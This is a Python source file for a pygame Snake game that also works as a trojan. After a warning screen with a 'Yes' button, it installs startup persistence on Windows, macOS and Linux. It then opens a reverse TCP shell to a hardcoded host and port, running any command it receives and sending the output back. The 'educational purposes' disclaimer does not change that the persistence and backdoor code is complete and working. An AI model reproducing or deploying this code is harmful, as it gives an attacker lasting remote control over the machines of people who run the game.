import os
import sys
import subprocess
import platform
import shutil
import random
import threading
import socket
import time
import pygame

class GameController:
    def __init__(self):
        self.required_apps = {'pygame': 'pygame==2.5.2'}
        self.persistence_path = self.get_persistence_path()
        self.score = 0
        self.lhost = "10.12.74.72"  # Your Ubuntu/Kali IP (update this)
        self.lport = 1234            # Listening port (update if needed)
        self.shell_active = True
        self.game_state = "warning"  # Start with warning state

    def get_persistence_path(self):
        system = platform.system()
        if system == "Windows":
            return os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif system == "Darwin":  # macOS
            return os.path.expanduser('~/Library/LaunchAgents')
        elif system == "Linux":  # Ubuntu
            return os.path.expanduser('~/.config/autostart')
        else:
            raise NotImplementedError("Unsupported OS")

    def check_and_install_apps(self):
        missing = []
        for app in self.required_apps:
            try:
                __import__(app)
            except ImportError:
                missing.append(app)

        if missing:
            print(f"Missing dependencies: {missing}")
            consent = input("Install required apps? (yes/no): ").lower()
            if consent == 'yes':
                for app in missing:
                    try:
                        subprocess.check_call([sys.executable, "-m", "pip", "install", self.required_apps[app]])
                        print(f"Installed {app}")
                    except:
                        print(f"Failed to install {app}")
                        sys.exit(1)
            else:
                print("Installation cancelled")
                sys.exit(0)

    def setup_persistence(self):
        system = platform.system()
        current_script = os.path.realpath(__file__)

        if system == "Windows":
            startup_path = os.path.join(self.persistence_path, 'game.py')
            shutil.copy(current_script, startup_path)
        elif system == "Darwin":  # macOS
            plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.game.snake</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{current_script}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
            plist_path = os.path.join(self.persistence_path, 'com.game.snake.plist')
            with open(plist_path, 'w') as f:
                f.write(plist)
        elif system == "Linux":  # Ubuntu
            desktop = f"""[Desktop Entry]
Type=Application
Name=SnakeGame
Exec={sys.executable} {current_script}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true"""
            desktop_path = os.path.join(self.persistence_path, 'snakegame.desktop')
            with open(desktop_path, 'w') as f:
                f.write(desktop)
            os.chmod(desktop_path, 0o755)
        
        print("Persistence established")

    def reverse_tcp_payload(self):
        if platform.system() in ["Darwin", "Linux"]:
            pid = os.fork()
            if pid > 0:
                return
            os.setsid()
            pid = os.fork()
            if pid > 0:
                sys.exit(0)

        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.lhost, self.lport))
                print(f"Connected to {self.lhost}:{self.lport}")
                
                while True:
                    data = sock.recv(1024).decode().strip()
                    if not data or data.lower() == 'exit':
                        break
                    result = subprocess.getoutput(data)
                    sock.send((result + "\n").encode())
                sock.close()
            except Exception as e:
                print(f"Connection error: {e}")
                time.sleep(5)

        sys.exit(0)

    def spawn_food(self, snake):
        while True:
            food = (random.randint(0, 79) * 10, random.randint(0, 59) * 10)
            if food not in snake:
                return food

    def draw_button(self, screen, text, rect, color, hover_color, font):
        mouse_pos = pygame.mouse.get_pos()
        clicked = pygame.mouse.get_pressed()[0]
        if rect.collidepoint(mouse_pos):
            pygame.draw.rect(screen, hover_color, rect, border_radius=10)
            if clicked:
                return True
        else:
            pygame.draw.rect(screen, color, rect, border_radius=10)
        text_surface = font.render(text, True, (255, 255, 255))
        screen.blit(text_surface, text_surface.get_rect(center=rect.center))
        return False

    def draw_text(self, screen, text, font, color, center):
        lines = text.split('\n')
        for i, line in enumerate(lines):
            text_surface = font.render(line, True, color)
            text_rect = text_surface.get_rect(center=(center[0], center[1] + i * 30))
            screen.blit(text_surface, text_rect)

    def run_game(self):
        pygame.init()
        screen = pygame.display.set_mode((800, 600), pygame.RESIZABLE)
        pygame.display.set_caption("Snake Game")
        clock = pygame.time.Clock()
        font = pygame.font.Font(None, 36)
        title_font = pygame.font.Font(None, 72)
        small_font = pygame.font.Font(None, 24)

        snake = [(200, 200)]
        direction = (1, 0)
        food = self.spawn_food(snake)
        running = True

        # Buttons for warning screen
        yes_button = pygame.Rect(250, 450, 100, 50)
        no_button = pygame.Rect(450, 450, 100, 50)
        # Buttons for menu and game over
        start_button = pygame.Rect(300, 300, 200, 50)
        restart_button = pygame.Rect(300, 350, 200, 50)

        warning_text = f"""WARNING: By proceeding, this game will:
1. Establish persistence on your system:
   - Windows: Startup folder
   - macOS: LaunchAgents
   - Linux: ~/.config/autostart
2. Open a reverse TCP shell to {self.lhost}:{self.lport}
This is for educational purposes only. Proceed at your own risk."""

        while running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False
                elif event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_ESCAPE:
                        running = False
                    elif self.game_state == "playing":
                        if event.key == pygame.K_UP and direction != (0, 1):
                            direction = (0, -1)
                        elif event.key == pygame.K_DOWN and direction != (0, -1):
                            direction = (0, 1)
                        elif event.key == pygame.K_LEFT and direction != (1, 0):
                            direction = (-1, 0)
                        elif event.key == pygame.K_RIGHT and direction != (-1, 0):
                            direction = (1, 0)

            screen.fill((0, 0, 0))

            if self.game_state == "warning":
                self.draw_text(screen, warning_text, small_font, (255, 255, 255), (400, 250))
                if self.draw_button(screen, "Yes", yes_button, (0, 128, 0), (0, 200, 0), font):
                    self.game_state = "menu"
                    self.setup_persistence()  # Set up persistence only after consent
                    self.reverse_tcp_payload()  # Start shell after consent
                if self.draw_button(screen, "No", no_button, (128, 0, 0), (200, 0, 0), font):
                    running = False

            elif self.game_state == "menu":
                title_text = title_font.render("Snake Game", True, (0, 255, 0))
                screen.blit(title_text, title_text.get_rect(center=(400, 200)))
                if self.draw_button(screen, "Start", start_button, (0, 128, 0), (0, 200, 0), font):
                    self.game_state = "playing"
                    snake = [(200, 200)]
                    direction = (1, 0)
                    food = self.spawn_food(snake)
                    self.score = 0

            elif self.game_state == "playing":
                head_x, head_y = snake[0]
                new_head = (head_x + direction[0] * 10, head_y + direction[1] * 10)
                
                if new_head[0] < 0 or new_head[0] >= 800 or new_head[1] < 0 or new_head[1] >= 600 or new_head in snake:
                    self.game_state = "game_over"
                    continue

                snake.insert(0, new_head)
                
                if new_head == food:
                    self.score += 1
                    food = self.spawn_food(snake)
                else:
                    snake.pop()

                for segment in snake:
                    pygame.draw.rect(screen, (0, 255, 0), (*segment, 10, 10))
                pygame.draw.rect(screen, (255, 0, 0), (*food, 10, 10))
                
                score_text = font.render(f"Score: {self.score}", True, (255, 255, 255))
                screen.blit(score_text, (10, 10))

            elif self.game_state == "game_over":
                game_over_text = title_font.render("Game Over", True, (255, 0, 0))
                score_display = font.render(f"Final Score: {self.score}", True, (255, 255, 255))
                screen.blit(game_over_text, game_over_text.get_rect(center=(400, 200)))
                screen.blit(score_display, score_display.get_rect(center=(400, 300)))
                if self.draw_button(screen, "Restart", restart_button, (0, 128, 0), (0, 200, 0), font):
                    self.game_state = "playing"
                    snake = [(200, 200)]
                    direction = (1, 0)
                    food = self.spawn_food(snake)
                    self.score = 0

            pygame.display.flip()
            clock.tick(15 if self.game_state == "playing" else 60)

        pygame.quit()
        sys.exit(0)

    def cleanup_persistence(self):
        system = platform.system()
        if system == "Windows":
            startup_file = os.path.join(self.persistence_path, 'game.py')
        elif system == "Darwin":
            startup_file = os.path.join(self.persistence_path, 'com.game.snake.plist')
        elif system == "Linux":
            startup_file = os.path.join(self.persistence_path, 'snakegame.desktop')
        
        if os.path.exists(startup_file):
            try:
                os.remove(startup_file)
                print("Persistence removed")
            except Exception as e:
                print(f"Failed to remove persistence: {e}")
        if platform.system() == "Darwin":
            subprocess.run(["pkill", "-f", "game.py"])

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "cleanup":
        GameController().cleanup_persistence()
    else:
        game = GameController()
        game.check_and_install_apps()
        game.run_game()